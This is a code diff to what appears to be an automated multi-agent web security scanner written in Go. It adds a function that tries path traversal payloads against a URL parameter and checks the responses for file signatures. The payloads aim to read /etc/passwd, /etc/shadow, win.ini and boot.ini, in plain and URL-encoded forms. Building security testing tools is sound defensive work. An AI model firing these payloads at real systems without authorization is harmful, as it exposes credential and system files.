@@ -12,6 +12,7 @@ import (
 	"fmt"
 	"log"
 	"net/url"
+	"runtime/debug"
 	"strings"
 	"sync/atomic"
 	"time"
@@ -58,7 +59,15 @@ func (p *PathTraversalSpecialist) OnEvent(event bus.Event) {
 	// Only process commands directed to this agent
 	if event.Type == bus.Command && event.ToAgent == p.id {
 		log.Printf("[%s] Received command: %v\n", p.id, event.Payload)
-		go p.executeTask(event)
+		go func() {
+			defer func() {
+				if rec := recover(); rec != nil {
+					log.Printf("[%s] PANIC in executeTask: %v\n%s\n", p.id, rec, debug.Stack())
+					p.reportError(event.FromAgent, fmt.Errorf("task panicked: %v", rec))
+				}
+			}()
+			p.executeTask(event)
+		}()
 	}
 }
 
@@ -179,7 +188,17 @@ func (p *PathTraversalSpecialist) reportCandidateIfFound(analysis string) {
 		fullURL = location
 	}
 
-	// Create candidate
+	// Attempt exploitation before reporting
+	if parameter != "" && fullURL != "" {
+		log.Printf("[%s] Attempting Path Traversal exploitation on parameter: %s\n", p.id, parameter)
+		if success, evidence := p.exploitPathTraversal(fullURL, parameter); success {
+			// Exploitation successful - report as Finding (verified)
+			p.reportFinding(fullURL, parameter, evidence)
+			return
+		}
+	}
+
+	// Exploitation failed - report as Candidate (unverified)
 	candidate := reporter.VulnerabilityCandidate{
 		Type:      "PathTraversal",
 		URL:       fullURL,
@@ -200,6 +219,105 @@ func (p *PathTraversalSpecialist) reportCandidateIfFound(analysis string) {
 		Payload:   string(candidateJSON),
 	}
 	p.bus.Publish("Reporter-01", event)
+}
+
+// exploitPathTraversal attempts to exploit Path Traversal by reading sensitive files
+func (p *PathTraversalSpecialist) exploitPathTraversal(targetURL, parameter string) (bool, string) {
+	// Common path traversal payloads with target files
+	type payloadTest struct {
+		payload   string
+		signature string // Expected content in response
+		platform  string // Target platform
+	}
+
+	tests := []payloadTest{
+		// Linux/Unix
+		{"../../../etc/passwd", "root:", "Linux"},
+		{"../../../../etc/passwd", "root:", "Linux"},
+		{"../../../../../etc/passwd", "root:", "Linux"},
+		{"../../../../../../etc/passwd", "root:", "Linux"},
+		{"../../../etc/shadow", "root:", "Linux"},
+
+		// Windows
+		{"../../../windows/win.ini", "[fonts]", "Windows"},
+		{"..\\..\\..\\windows\\win.ini", "[fonts]", "Windows"},
+		{"../../../boot.ini", "[boot loader]", "Windows"},
+		{"..\\..\\..\\boot.ini", "[boot loader]", "Windows"},
+
+		// Alternative encodings
+		{"..%2f..%2f..%2fetc%2fpasswd", "root:", "Linux"},
+		{"..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]", "Windows"},
+	}
+
+	for _, test := range tests {
+		// Construct test URL with payload
+		testURL, err := p.injectPayload(targetURL, parameter, test.payload)
+		if err != nil {
+			log.Printf("[%s] Failed to construct test URL: %v\n", p.id, err)
+			continue
+		}
+
+		// Replace localhost for Docker
+		dockerURL := p.replaceLocalhostForDocker(testURL)
+
+		// Send HTTP request
+		response, err := tools.SimpleHTTPGet(p.ctx, p.executor, dockerURL)
+		if err != nil {
+			log.Printf("[%s] HTTP request failed for payload test: %v\n", p.id, err)
+			continue
+		}
+
+		// Check if signature is present in response
+		if strings.Contains(response, test.signature) {
+			evidence := fmt.Sprintf("Path Traversal verified on %s system. Payload: %s, Signature found: %s",
+				test.platform, test.payload, test.signature)
+			log.Printf("[%s] ✅ PATH TRAVERSAL VERIFIED: %s\n", p.id, evidence)
+			return true, evidence
+		}
+	}
+
+	log.Printf("[%s] ❌ Path Traversal exploitation failed: No sensitive file content detected\n", p.id)
+	return false, ""
+}
+
+// injectPayload injects the path traversal payload into the target URL parameter
+func (p *PathTraversalSpecialist) injectPayload(targetURL, parameter, payload string) (string, error) {
+	parsedURL, err := url.Parse(targetURL)
+	if err != nil {
+		return "", err
+	}
+
+	// Get existing query parameters
+	query := parsedURL.Query()
+
+	// Set the parameter with payload
+	query.Set(parameter, payload)
+
+	parsedURL.RawQuery = query.Encode()
+	return parsedURL.String(), nil
+}
+
+// reportFinding reports a verified Path Traversal vulnerability
+func (p *PathTraversalSpecialist) reportFinding(targetURL, parameter, evidence string) {
+	finding := reporter.VulnerabilityFinding{
+		Type:        "PathTraversal",
+		Severity:    "Critical",
+		URL:         targetURL,
+		Payload:     parameter,
+		Description: fmt.Sprintf("Path Traversal vulnerability verified on parameter '%s'. %s. Recommendation: Implement strict input validation, use whitelists for allowed paths, and avoid direct file system access with user input.", parameter, evidence),
+		Timestamp:   time.Now().Format(time.RFC1123),
+	}
+
+	findingJSON, _ := json.Marshal(finding)
+	event := bus.Event{
+		ID:        fmt.Sprintf("%s-finding-%d", p.id, ptMessageCounter.Add(1)),
+		FromAgent: p.id,
+		ToAgent:   "Reporter-01",
+		Type:      bus.Finding,
+		Payload:   string(findingJSON),
+	}
+	p.bus.Publish("Reporter-01", event)
+	log.Printf("[%s] 🎯 Reported verified Path Traversal finding: %s (param: %s)\n", p.id, targetURL, parameter)
 }
 
 func (p *PathTraversalSpecialist) reportObservation(toAgent string, observation string) {
